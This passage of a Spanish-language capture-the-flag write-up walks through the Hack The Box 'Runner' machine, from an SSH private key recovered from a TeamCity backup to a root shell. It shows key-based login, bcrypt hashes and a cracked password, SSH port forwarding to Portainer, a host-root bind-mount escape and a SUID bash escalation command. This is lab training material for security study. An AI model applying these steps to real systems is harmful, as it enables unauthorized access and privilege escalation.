</span></span></span><span class=line><span class=cl><span class=go>yeuwJZVmHy0YVVjxq3d5jiFMzqJYpC0MZIj/L6Q3inBl/Qc09d9zqTw1wAd1ocg13PTtZA
</span></span></span><span class=line><span class=cl><span class=go>mgXIjAdnpZqGbqPIJjzUYua2z4mMOyJmF4c3DQDHEtZBEP0Z4DsBCudiU5QUOcduwf61M4
</span></span></span><span class=line><span class=cl><span class=go>CtgiWETiQ3ptiCPvGoBkEV8ytMLS8tx2S77JyBVhe3u2IgeyQx0BBHqnKS97nkckXlAAAA
</span></span></span><span class=line><span class=cl><span class=go>wF8nu51q9C0nvzipnnC4obgITpO4N7ePa9ExsuSlIFWYZiBVc2rxjMffS+pqL4Bh776B7T
</span></span></span><span class=line><span class=cl><span class=go>PSZUw2mwwZ47pIzY6NI45mr6iK6FexDAPQzbe5i8gO15oGIV9MDVrprjTJtP+Vy9kxejkR
</span></span></span><span class=line><span class=cl><span class=go>3np1+WO8+Qn2E189HvG+q554GQyXMwCedj39OY71DphY60j61BtNBGJ4S+3TBXExmY4Rtg
</span></span></span><span class=line><span class=cl><span class=go>lcZW00VkIbF7BuCEQyqRwDXjAk4pjrnhdJQAfaDz/jV5o/cAAAAMEAugPWcJovbtQt5Ui9
</span></span></span><span class=line><span class=cl><span class=go>WQaNCX1J3RJka0P9WG4Kp677ZzjXV7tNufurVzPurrxyTUMboY6iUA1JRsu1fWZ3fTGiN/
</span></span></span><span class=line><span class=cl><span class=go>TxCwfxouMs0obpgxlTjJdKNfprIX7ViVrzRgvJAOM/9WixaWgk7ScoBssZdkKyr2GgjVeE
</span></span></span><span class=line><span class=cl><span class=go>7jZoobYGmV2bbIDkLtYCvThrbhK6RxUhOiidaN7i1/f1LHIQiA4+lBbdv26XiWOw+prjp2
</span></span></span><span class=line><span class=cl><span class=go>EKJATR8rOQgt3xHr+exgkGwLc72Q61AAAAwQDO2j6MT3aEEbtgIPDnj24W0xm/r+c3LBW0
</span></span></span><span class=line><span class=cl><span class=go>axTWDMGzuA9dg6YZoUrzLWcSU8cBd+iMvulqkyaGud83H3C17DWLKAztz7pGhT8mrWy5Ox
</span></span></span><span class=line><span class=cl><span class=go>KzxjsB7irPtZxWmBUcFHbCrOekiR56G2MUCqQkYfn6sJ2v0/Rp6PZHNScdXTMDEl10qtAW
</span></span></span><span class=line><span class=cl><span class=go>QHkfhxGO8gimrAvjruuarpItDzr4QcADDQ5HTU8PSe/J2KL3PY7i4zWw9+/CyPd0t9yB5M
</span></span></span><span class=line><span class=cl><span class=go>KgK8c9z2ecgZsAAAALam9obkBydW5uZXI=
</span></span></span><span class=line><span class=cl><span class=go>-----END OPENSSH PRIVATE KEY-----
</span></span></span></code></pre></div><p>pero de momento no tengo usuarios. De manera que esta key, de momento, no es √∫til por s√≠ sola.</p><p>De vuelta al panel de <code>TeamCity</code>, en <code>Administration</code> puedo ver una opci√≥n de <code>Users</code>. Clickeando en √©sta muestra una tabla:</p><p><img alt="Runner 6" src=/pentesting/images/Runner_6.png></p><p>de donde puedo ver distintos usuarios los cuales han sido agregados a medida que fui testeando los exploits. No obtante, puedo ver 2 usuarios que no parecen ser de los exploits: <code>john</code> y <code>matthew</code>.</p><p>Guardo estos usuarios en un archivo llamado <code>potential_users.txt</code> y con <code>NetExec</code> reviso si alguno de estos usuarios se puede loguear a trav√©s de <code>SSH</code> con la key que hemos encontrado:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec ssh 10.10.11.13 -u potential_users.txt --key-file id_rsa -p &#39;&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SSH         10.10.11.13     22     10.10.11.13      [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
</span></span></span><span class=line><span class=cl><span class=go>SSH         10.10.11.13     22     10.10.11.13      [-] matthew: (keyfile: id_rsa) Authentication failed.
</span></span></span><span class=line><span class=cl><span class=go>SSH         10.10.11.13     22     10.10.11.13      [+] john: (keyfile: id_rsa)  (non root) Linux - Shell access!
</span></span></span></code></pre></div><p>De manera que esta key funciona para el usuario <code>john</code>. Nos logueamos entonces por <code>SSH</code> como este usuario:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ssh -i id_rsa john@10.10.11.13
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>john@runner:~$
</span></span></span></code></pre></div><p>y podemos obtener la flag de usuario en el directorio <code>/home/john</code>.</p><hr><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Noto que, como hab√≠amos visto anteriormente, hay 2 usuarios en la m√°quina llamados <code>john</code> y <code>matthew</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>john@runner:~$ ls /home
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>john  matthew
</span></span></span></code></pre></div><p>Ahora que tenemos usuarios, tambi√©n dedicod chequear si sus nombres estaban contenidos dentro el archivo <code>backup</code> que hab√≠amos descargado previamente. Buscando por la cadena <code>john</code> nos da:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo grep -ri &#34;john&#34; .
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>./database_dump/comments:201, -42, 1709746543407, &#34;New username: \&#39;admin\&#39;, new name: \&#39;John\&#39;, new email: \&#39;john@runner.htb\&#39;&#34;
</span></span></span><span class=line><span class=cl><span class=go>./database_dump/users:1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1716949177384, BCRYPT
</span></span></span></code></pre></div><p>de donde puedo ver un hash el cual decido guardar.</p><p>Si busco por la cadena <code>matthew</code> obtengo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo grep -ri &#34;matthew&#34; .
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>./config/projects/AllProjects/project-config.xml.1:  &lt;description&gt;Matthew&#39;s projects&lt;/description&gt;
</span></span></span><span class=line><span class=cl><span class=go>./config/_trash/AllProjects.project1/project-config.xml:  &lt;description&gt;Matthew&#39;s projects&lt;/description&gt;
</span></span></span><span class=line><span class=cl><span class=go>./database_dump/users:2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
</span></span></span><span class=line><span class=cl><span class=go>./database_dump/vcs_username:2, anyVcs, -1, 0, matthew
</span></span></span><span class=line><span class=cl><span class=go>./system/pluginData/audit/configHistory/projects/project1/config.xml.1:  &lt;description&gt;Matthew&#39;s projects&lt;/description&gt;
</span></span></span></code></pre></div><p>de donde puedo ver otro hash.</p><p>Guardo ambos hashes en un archivo en mi m√°quina de atacante u trato de crackearlos a trav√©s de un <code>Brute Force Password Cracking</code> (crackear las contrase√±as por fuerza bruta) con la herramienta <code>JohnTheRipper</code> junto con el diccionario <code>rockyou.txt</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ john --wordlist=/usr/share/wordlists/rockyou.txt hashes_found
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Using default input encoding: UTF-8
</span></span></span><span class=line><span class=cl><span class=go>Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
</span></span></span><span class=line><span class=cl><span class=go>Cost 1 (iteration count) is 128 for all loaded hashes
</span></span></span><span class=line><span class=cl><span class=go>Will run 5 OpenMP threads
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span></span><span class=line><span class=cl><span class=go>piper123         (matthew)
</span></span></span><span class=line><span class=cl><span class=go>1g 0:00:06:22 2.66% (ETA: 04:06:53) 0.002615g/s 1160p/s 1296c/s 1296C/s 303606..301298
</span></span></span><span class=line><span class=cl><span class=go>Use the &#34;--show&#34; option to display all of the cracked passwords reliably
</span></span></span></code></pre></div><p>de donde obtenemos credenciales: <code>matthew:piper123</code>. Sin embargo, estas credenciales no funcionan para pivotear internamente al usuario <code>matthew</code> dentro de la m√°quina, de manera que las guardamos para despu√©s.</p><p>De vuelta a la m√°quina v√≠ctima, busco por puertos abiertos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>john@runner:~$ ss -ntlp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>State               Recv-Q              Send-Q                           Local Address:Port                             Peer Address:Port              Process
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   4096                                 127.0.0.1:9000                                  0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   4096                                 127.0.0.1:5005                                  0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   4096                             127.0.0.53%lo:53                                    0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   4096                                 127.0.0.1:9443                                  0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   511                                    0.0.0.0:80                                    0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   128                                    0.0.0.0:22                                    0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   4096                                 127.0.0.1:8111                                  0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   4096                                         *:8000                                        *:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   511                                       [::]:80                                       [::]:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN              0                   128                                       [::]:22                                       [::]:*
</span></span></span></code></pre></div><p>Luego de explorar un poco, noot que el puerto <code>9000</code>, el cual no estaba p√∫blicamente expuesto, es un sitio web gracias a <code>cURL</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>john@runner:~$ curl -s http://localhost:9000 | head -n 3
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;!doctype html&gt;&lt;html lang=&#34;en&#34; ng-app=&#34;portainer&#34; ng-strict-di data-edition=&#34;CE&#34;&gt;&lt;head&gt;&lt;meta charset=&#34;utf-8&#34;/&gt;&lt;title&gt;Portainer&lt;/title&gt;&lt;meta name=&#34;description&#34; content=&#34;&#34;/&gt;&lt;meta name=&#34;author&#34; content=&#34;Portainer.io&#34;/&gt;&lt;meta http-equiv=&#34;cache-control&#34; content=&#34;no-cache&#34;/&gt;&lt;meta http-equiv=&#34;expires&#34; content=&#34;0&#34;/&gt;&lt;meta http-equiv=&#34;pragma&#34; content=&#34;no-cache&#34;/&gt;&lt;base id=&#34;base&#34;/&gt;&lt;script&gt;if (window.origin == &#39;file://&#39;) {
</span></span></span><span class=line><span class=cl><span class=go>        // we are loading the app from a local file as in docker extension
</span></span></span><span class=line><span class=cl><span class=go>        document.getElementById(&#39;base&#39;).href = &#39;http://localhost:49000/&#39;;
</span></span></span></code></pre></div><p>Dado que tenemos credenciales por <code>SSH</code>, podemos tratar de performar un <code>Local Port Forwarding</code> para ganar acceso al puerto interno identificado. Salgo de la sesi√≥n actual de <code>SSH</code>, y me reconecto a la m√°quina v√≠ctima, pero esta vez convierto el puerto <code>9000</code> de la m√°quina v√≠ctima en m√≠ puerto <code>9000</code> tambi√©n. Para esto corremos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ssh -i id_rsa -L 9000:localhost:9000 john@10.10.11.13
</span></span></span></code></pre></div><p>Hecho esto, visitamos <code>http://localhost:9000</code> en mi browser de internet y puedo ver un sitio web corriendo <code>Portainer</code>:</p><p><img alt="Runner 7" src=/pentesting/images/Runner_7.png></p><p><div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Informaci√≥n</div><div class=notice-content><code>Portainer</code> is a tool that can be used to monitor your Docker installation, interact with containerized apps, and deploy new stacks with minimal effort. A single <code>Portainer</code> instance can connect to multiple <code>Docker</code> hosts, centralizing your container</div></div>En resumen, es un aplicativo que nos ayuda a administrar contenedores como <code>Docker</code> proporcionando una interfaz gr√°fica.</p><p>Luego de una breve investigaci√≥n encuentro <a href=https://nitroc.org/en/posts/cve-2024-21626-illustrated/#exploit-via-setting-working-directory-to-procselffdfd class=external-link target=_blank rel=noopener>este blog en donde se explica c√≥mo abusar de una running condition con Docker</a>. √âsta se basa en <a href=https://nvd.nist.gov/vuln/detail/CVE-2024-21626 class=external-link target=_blank rel=noopener>CVE-2024-21626</a> de donde, en corto, se abusa de un running condition para que un container pueda acceder a la ra√≠z <code>/</code> del sistema. Y de all√±i viene el nombre de la m√°quina: &ldquo;Runner&rdquo; -> Abusar de runC (running conditions).</p><p>Trato de loguearme con las √∫nicas credenciales que hemos hallado, aquellas para el usuario <code>matthew</code> (<code>matthew:piper123</code>). Y las credenciales funcionan. Una vez dentro podemos ver:</p><p><img alt="Runner 8" src=/pentesting/images/Runner_8.png></p><p>Si clickeo el container que dice <code>primary</code> ahora tenemos m√°s opciones mostradas al lado izquierdo. Primero, agregamos un <code>Volume</code> (qu√© es lo que es un <code>Volume</code> est√° mejor explicado <a href=https://docs.portainer.io/user/docker/volumes class=external-link target=_blank rel=noopener>aqu√≠</a>). B√°sicamente, &ldquo;un volumen es un √°rea de almacenamiento de datos que puede montarse en un contenedor para proporcionar almacenamiento persistente&rdquo;. De manera que podemos crear un nuevo <code>Volume</code> para evitar problemas a futuro. <a href=https://docs.portainer.io/user/docker/volumes/add class=external-link target=_blank rel=noopener>Siguiendo las instrucciones de c√≥mo agregar un Volume es Portainer</a>, podemos ir a <code>Volume</code>, luego <code>Add volume</code>. En mi caso le dar√© el nombre de <code>test</code> y como la opci√≥n <code>Driver</code> selecciono <code>local</code>. Finalmente, quiero que √©ste sea un volumen <code>Private</code> (privado).</p><p><img alt="Runner 10" src=/pentesting/images/Runner_10.png></p><p>Donde, adem√°s, clickeo en <code>add driver option</code> y agrego las opciones: <code>driver:/</code>, <code>o:bind</code>, <code>type:none</code> dado que queremos crear un <code>Volume</code> <a href=https://docs.portainer.io/user/docker/volumes/add#adding-a-tmpfs-volume class=external-link target=_blank rel=noopener>tal cual se explica aqu√≠</a>.</p><p>Clickeando en la opci√≥n <code>Volume</code> y luego en nuestro <code>Volume</code> reci√©n creado (llamado <code>test</code>), deber√≠amos de ver:</p><p><img alt="Runner 18" src=/pentesting/images/Runner_18.png></p><p>Ahora que hemos verificado que hemos creado un <code>Volume</code>, vamos a <code>Containers</code> y creamos un nuevo container usando la opci√≥n <code>Add container</code>. Si todo va bien ahora deber√≠amos de ver:</p><p><img alt="Runner 13" src=/pentesting/images/Runner_13.png></p><p>como <code>Image</code> (imagen del container) elio la opci√≥n <code>teamcity:latest</code>, dado que, si visitamos la secci√≥n de <code>Images</code> podemos ver que hay 2 im√°genes disponibles:</p><p><img alt="Runner 14" src=/pentesting/images/Runner_14.png></p><p>de manera que simplemente us√© la que no estaba siendo usada.</p><p>Yendo a la parte inferior de la parte de container creator, puedo ver una secci√≥n llamada <code>Advanced container settings</code>. All√≠, en la pesta√±a <code>Command & logging</code> seleccionar√© la opci√≥n <code>Interactive & TTY</code>:</p><p><img alt="Runner 11" src=/pentesting/images/Runner_11.png></p><p>y en la pesta√±a de <code>Volumes</code>, clickeamos en <code>+ map additional volume</code>. Pondr√© como <code>container</code> el valor <code>/mnt/root</code> (para crear una montura) y seleccionar el volumen que hemos creado (el cual, recordar, he llamado <code>test</code>):</p><p><img alt="Runner 12" src=/pentesting/images/Runner_12.png></p><p>Finalmente, clickeo en <code>Deploy the container</code>, espero y veo que √©ste container es creado tal cual puedo verificar en la secci√≥n <code>Containers</code>:</p><p><img alt="Runner 15" src=/pentesting/images/Runner_15.png></p><p>Clickeando en mi container puedo ver una opci√≥n de <code>Console</code> (consola) en la parte inferior de la primera ventana:</p><p><img alt="Runner 16" src=/pentesting/images/Runner_16.png></p><p>Clickeando en √©sta spawnea una nueva ventana la cual nos pregunta como qu√© usuario queremos correr el container. Decimos que queremos correrlo como el usuario <code>root</code> y clickeamos en <code>Connect</code>:</p><p><img alt="Runner 17" src=/pentesting/images/Runner_17.png></p><p>Una nueva consola aparece. Analizando los contenidos a los que tenemos acceso con esta nueva consola noto que el directorio <code>/mnt/root</code> contiene una copia del directorio <code>/</code> (ra√≠z) de la m√°quina original. Como podemos ver, el archivo <code>root.txt</code> est√° localizado en <code>/mnt/root/root</code>. De manera que podemos leer archivos los cuales s√≥lo deber√≠an poder ser le√≠dos por <code>root</code>. No hay ning√∫n archivo <code>id_rsa</code> para <code>root</code>, de manera que no nos podemos conectar via <code>SSH</code>. De todas formas, ya podemos leer la flag y con esto completamos la m√°quina:</p><p><img alt="Runner 19" src=/pentesting/images/Runner_19.png></p><p>Para acceder al sistema original podemos retocar los archivos dentro del directorio <code>/mnt/root</code>, los cuales a su vez modificar√°n los del sistema original. Por lo que podr√≠amos, por ejemplo, asignar privilegios de <code>SUID</code> al binario de <code>bash</code> (corriendo <code>chmod 4755 /bin/bash</code>) y convertirnos en <code>root</code> con <code>/bin/bash -p</code>.</p><p>~ Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Desarrollado por <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>